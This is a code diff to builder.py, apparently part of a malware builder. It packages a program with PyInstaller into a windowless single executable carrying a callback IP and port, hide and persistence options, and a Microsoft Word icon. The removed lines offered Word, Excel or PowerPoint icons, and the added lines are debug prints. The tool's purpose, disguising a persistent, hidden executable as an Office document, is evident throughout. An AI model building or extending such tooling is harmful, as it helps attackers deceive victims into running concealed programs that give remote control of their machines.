@@ -72,14 +72,23 @@ class Executor(object):
         return data
 
     def compile_file(self, path):
+
+        print('\n--------------------------------------------------------')
+        print(f"Inside builder.py compile_file() with path: {path}")
         path = os.path.abspath(path)
 
         build_path = os.path.join(self.tmp_dir, 'build')
         cmd = 'pyinstaller -y -F -w -i {} {}'.format(
             self.icon, shlex.quote(path))
 
+        print(f"Inside builder.py compile_file() with command: {cmd}")
+
         sys.argv = shlex.split(cmd) + ['--distpath', self.dist_path] + \
             ['--workpath', build_path] + ['--specpath', self.tmp_dir]
+        
+        print(f"Inside builder.py compile_file() with sys.argv: {sys.argv}")
+        print('--------------------------------------------------------\n')
+        print()
 
         pyi.run()
 
@@ -144,24 +153,8 @@ class Executor(object):
 if __name__ == '__main__':
     args = Args()
     if args.set_args():
-        if not args.icon:
-            icons = {
-                1: 'icons/wordicon.ico',
-                2: 'icons/excelicon.ico',
-                3: 'icons/ppticon.ico'
-            }
 
-            option = input(
-                '\n\n1) MS Word\n2) MS Excel\n3) MS Powerpoint\n\nSelect an icon option: ')
-
-            if not option.isdigit():
-                args.icon = icons[1]
-            elif int(option) > 3 or int(option) < 1:
-                args.icon = icons[1]
-            else:
-                args.icon = icons[int(option)]
-
-            args.icon = os.path.abspath(args.icon)
+        args.icon = os.path.abspath("icons/wordicon.ico")
 
         executor = Executor(args.ip, args.port, args.name,
                             args.wait, args.icon, args.hide, args.persist)
@@ -169,4 +162,4 @@ if __name__ == '__main__':
         executor.start()
         os.system('cls' if is_win else 'clear')
         print(f'Finished generating {executor.filename}')
-        print('Look in the directory named \'output\' for your exe file')
+        print('Look in the directory named \'output\' for your file')
